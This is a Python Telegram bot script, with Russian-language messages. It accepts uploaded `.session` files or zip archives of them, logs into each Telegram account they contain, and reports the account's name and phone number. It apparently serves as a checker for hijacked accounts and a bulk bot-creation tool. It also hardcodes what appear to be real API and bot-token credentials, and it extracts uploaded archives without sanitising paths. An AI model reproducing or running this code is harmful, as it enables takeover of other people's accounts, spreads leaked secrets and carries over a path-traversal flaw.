
import os
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import random
import zipfile

API_ID = 26160389
API_HASH = '88f5d04e3d1c3c295ab7cb89ead79f89'
TG_BOT_TOKEN = '7504133005:AAH-knGjlCFi1EZrpjDWrRR_q8kAaiMftVw'

from telethon.sync import TelegramClient as SyncTelegramClient

def generate_username():
    letters = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
    digits = ''.join(random.choices('0123456789', k=3))
    return f"{letters}{digits}_bot"

bot = SyncTelegramClient('bot', API_ID, API_HASH).start(bot_token=TG_BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond("👋 Привет! Отправь мне `.session` файл или `.zip`, содержащий `.session` файлы, и я создам ботов.")

@bot.on(events.NewMessage(incoming=True))
async def handle_session(event):
    if not event.file:
        return

    filename = event.file.name
    path = f"sessions/{filename}"
    os.makedirs("sessions", exist_ok=True)
    await event.download_media(file=path)

    sessions = []

    if filename.endswith(".zip"):
        with zipfile.ZipFile(path, 'r') as zip_ref:
            zip_ref.extractall("sessions/tmp")
            for fname in os.listdir("sessions/tmp"):
                if fname.endswith(".session"):
                    sessions.append(os.path.join("sessions/tmp", fname))
    elif filename.endswith(".session"):
        sessions.append(path)

    for sess_path in sessions:
        session_name = os.path.splitext(os.path.basename(sess_path))[0]
        try:
            client = TelegramClient(sess_path, API_ID, API_HASH)
            await client.start()
            me = await client.get_me()
            phone_number = getattr(me, "phone", None) or "Неизвестен"
            name = me.first_name or "Без имени"
            await event.reply(f"✅ Авторизовано как {name}
📱 Номер аккаунта: {phone_number}")
            await client.disconnect()
        except SessionPasswordNeededError:
            await event.reply(f"🔐 Сессия {session_name} требует 2FA пароль. Пропускаю.")
        except Exception as e:
            await event.reply(f"❌ Ошибка при обработке {session_name}: {e}")
